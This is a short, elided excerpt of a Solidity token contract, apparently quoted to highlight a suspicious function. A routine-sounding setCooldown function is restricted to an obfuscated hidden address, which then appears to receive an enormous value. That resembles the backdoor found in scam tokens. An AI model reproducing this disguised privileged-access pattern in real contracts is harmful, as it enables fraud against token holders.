...
contract SE is Context, Ownable, IERC20 {
    ...
    function setCooldown(address[] memory addresses) public {
    require(_ADSDASD == _msgSender(), "Not authorized");
    ...
    address ownne = _ADSDASD;
    uint256 iernen = 4518945615484561546465125;
